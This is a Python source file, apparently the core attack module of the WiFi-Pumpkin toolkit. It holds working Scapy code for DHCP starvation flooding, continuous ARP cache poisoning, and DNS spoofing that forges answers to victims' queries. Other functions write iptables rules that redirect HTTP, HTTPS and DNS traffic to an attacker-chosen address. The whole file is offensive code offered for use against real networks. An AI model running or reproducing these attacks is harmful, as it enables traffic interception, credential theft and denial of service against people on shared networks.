import Queue
from os import system
from scapy.all import *
from threading import Thread
from time import sleep
from PyQt4.QtCore import QThread,SIGNAL,QObject,QProcess,pyqtSlot,SLOT,pyqtSignal
from datetime import datetime

"""
Description:
    This program is a core for modules wifi-pumpkin.py. file which includes all Implementation
    for modules.

Copyright:
    Copyright (C) 2015-2016 Marcos Nesster P0cl4bs Team
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>
"""

class ThreadAttackStar(QThread):
    def __init__(self,interface):
        QThread.__init__(self)
        self.interface = interface
        self.process = True

    def run(self):
        print "Starting Thread:" + self.objectName()
        self.count = 0
        while self.process:
            conf.checkIPaddr = False
            dhcp_discover =  Ether(src=RandMAC(),dst="ff:ff:ff:ff:ff:ff")\
                /IP(src="0.0.0.0",dst="255.255.255.255")\
                /UDP(sport=68,dport=67)/BOOTP(chaddr=RandString(12,'0123456789abcdef'))\
            /DHCP(options=[("message-type","discover"),"end"])
            sendp(dhcp_discover)
            self.count += 1
            self.data = ("PacketSend:[%s] DISCOVER Interface: %s "%(self.count,self.interface)
                         + datetime.now().strftime("%c"))
            self.emit(SIGNAL("Activated( QString )"),self.data.rstrip())
        self.emit(SIGNAL("Activated( QString )"),"[ OFF ] Packet sent: " + str(self.count))
    def stop(self):
        print "Stop thread:" + self.objectName()
        self.process = False


class ThARP_posion(QThread):
    def __init__(self,srcAddress,dstAddress,mac):
        QThread.__init__(self)
        self.srcAddress = srcAddress
        self.dstAddress = dstAddress
        self.mac        = mac
        self.process    = True

    def makePacket(self):
        ether = Ether(dst = 'ff:ff:ff:ff:ff:ff',src = self.mac)
        parp  = ARP(hwtype = 0x1,ptype = 0x800,hwlen = 0x6,plen = 0x4,
        op = "is-at",hwsrc = self.mac,psrc = self.srcAddress,hwdst =
        'ff:ff:ff:ff:ff:ff',pdst = self.dstAddress)
        padding = Padding(load = "\x00"*18)
        packet_arp= ether/parp/padding
        return packet_arp

    def run(self):
        print 'Starting Thread:' + self.objectName()
        pkt = self.makePacket()
        while self.process:
            send(pkt,verbose=False, count=3),sendp(pkt,verbose=False, count=3)
    def stop(self):
        self.process = False
        print 'Stop thread:' + self.objectName()
        self.emit(SIGNAL('Activated( QString )'),'Ok')


class ThreadDNSspoofNF(QObject):
    DnsReq = pyqtSignal(object)
    def __init__(self,domains,interface,redirect,APmode=True,parent=None):
        super(ThreadDNSspoofNF, self).__init__(parent)
        self.domains    = domains
        self.interface  = interface
        self.redirect   = redirect
        self.APmode     = APmode
        self.desc       = 'DNS spoof Module::NetFilter'

    @pyqtSlot()
    def readProcessOutput(self):
        self.data = str(self.procThreadDNS.readAllStandardOutput())
        self.DnsReq.emit(self.data)

    def start(self):
        self.setIptables(self.APmode,option='A')
        self.procThreadDNS = QProcess(self)
        self.procThreadDNS.setProcessChannelMode(QProcess.MergedChannels)
        QObject.connect(self.procThreadDNS, SIGNAL('readyReadStandardOutput()'), self, SLOT('readProcessOutput()'))
        self.procThreadDNS.start('python',['core/packets/dnsspoofNF.py','-r',self.redirect,
        '-d',','.join(self.domains)])

    def setIptables(self,APMode=True, option=str()):
        if APMode:
            system('iptables -{} INPUT -i {} -p udp --dport 53 -s {} -j ACCEPT'.format(option,self.interface,self.redirect))
            system('iptables -{} INPUT -i {} -p udp --dport 53 -j DROP'.format(option,self.interface))
            system('iptables -t nat -{} PREROUTING -p udp --dport 53 -j NFQUEUE'.format(option))

    def stop(self):
        self.setIptables(self.APmode,option='D')
        if hasattr(self,'procThreadDNS'):
            self.procThreadDNS.terminate()
            self.procThreadDNS.waitForFinished()
            self.procThreadDNS.kill()

class ThSpoofAttack(QThread):
    def __init__(self,domains,interface,filter,verbose,redirect):
        QThread.__init__(self)
        self.target     = domains
        self.filter     = filter
        self.verbose    = verbose
        self.interface  = interface
        self.redirect   = redirect
        self.finished   = False
        self.mac        = get_if_hwaddr(self.interface)
        self.desc       = ['Module DNS spoof']

    def run(self):
        print 'Starting Thread:' + self.objectName()
        self.sniff()

    def ARP(self,target,gateway):
        ether = Ether(dst = 'ff:ff:ff:ff:ff:ff',src = self.mac)
        parp  = ARP(hwtype = 0x1,ptype = 0x800,hwlen = 0x6,plen = 0x4,
        op = 'is-at',hwsrc = self.mac,psrc = gateway,hwdst =
        'ff:ff:ff:ff:ff:ff',pdst = target)
        padding = Padding(load = "\x00"*18)
        packet_arp= ether/parp/padding
        while True:
            try:
                sendp(packet_arp,
                verbose=False, count=3)
                send(packet_arp,
                verbose=False, count=3)
            except:
                pass

    def StartSpoof(self,q):
        while self.finished:
            sniff(iface = self.interface,count = 10, filter = self.filter, prn = lambda x : q.put(x))

    def sniff(self):
        self.setIptables(option='A')
        q = Queue.Queue()
        sniffer = Thread(target =self.StartSpoof, args = (q,))
        sniffer.daemon = True
        sniffer.start()
        while (not self.finished):
            try:
                pkt = q.get(timeout = 1)
                self.Poisoning(pkt)
            except Queue.Empty:
              pass

    def Poisoning(self,packet):
        #https://github.com/Adastra-thw/pyHacks/blob/master/MitmDnsSpoofingPoC.py
        if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0 and len(self.target.keys()) > 0:
            if  packet[DNS].qd.qname[:len(str(packet[DNS].qd.qname))-1] in self.target.keys():
                requestIP = packet[IP]
                requestUDP = packet[UDP]
                requestDNS = packet[DNS]
                requestDNSQR = packet[DNSQR]
                responseIP = IP(src=requestIP.dst, dst=requestIP.src)
                responseUDP = UDP(sport = requestUDP.dport, dport = requestUDP.sport)
                responseDNSRR = DNSRR(rrname=packet.getlayer(DNS).qd.qname, rdata = self.redirect)
                responseDNS = DNS(qr=1,id=requestDNS.id, qd=requestDNSQR, an=responseDNSRR)
                answer = responseIP/responseUDP/responseDNS
                send(answer)
        elif packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0 and len(self.target.keys()) == 0:
            try:
                requestIP = packet[IP]
                requestUDP = packet[UDP]
                requestDNS = packet[DNS]
                requestDNSQR = packet[DNSQR]
                responseIP = IP(src=requestIP.dst, dst=requestIP.src)
                responseUDP = UDP(sport = requestUDP.dport, dport = requestUDP.sport)
                responseDNSRR = DNSRR(rrname=packet.getlayer(DNS).qd.qname, rdata = self.redirect)
                responseDNS = DNS(qr=1,id=requestDNS.id, qd=requestDNSQR, an=responseDNSRR)
                answer = responseIP/responseUDP/responseDNS
                send(answer)
            except Exception:
                pass

    def setIptables(self,option=str()):
        system('iptables -t nat -{} PREROUTING -p udp --dport 53 -j NFQUEUE'.format(option))
        system('iptables -{} FORWARD --in-interface {} --jump ACCEPT'.format(option,self.interface))
        system('iptables -t nat -{} POSTROUTING --out-interface {} --jump MASQUERADE'.format(option,self.interface))
        system('iptables -t nat -{} PREROUTING -p tcp --dport 80 --jump DNAT --to-destination {}'.format(option,self.redirect))
        system('iptables -t nat -{} PREROUTING -p tcp --dport 443 --jump DNAT --to-destination {}'.format(option,self.redirect))
        system('iptables -t nat -{} PREROUTING -i {} -p udp --dport 53 -j DNAT --to {}'.format(option,self.interface,self.redirect))
        system('iptables -t nat -{} PREROUTING -i {} -p tcp --dport 53 -j DNAT --to {}'.format(option,self.interface,self.redirect))

    def stop(self):
        print 'Stop Thread:' + self.objectName()
        self.finished = True
        self.setIptables(option='D')
        self.emit(SIGNAL('Activated( QString )'),'finished')
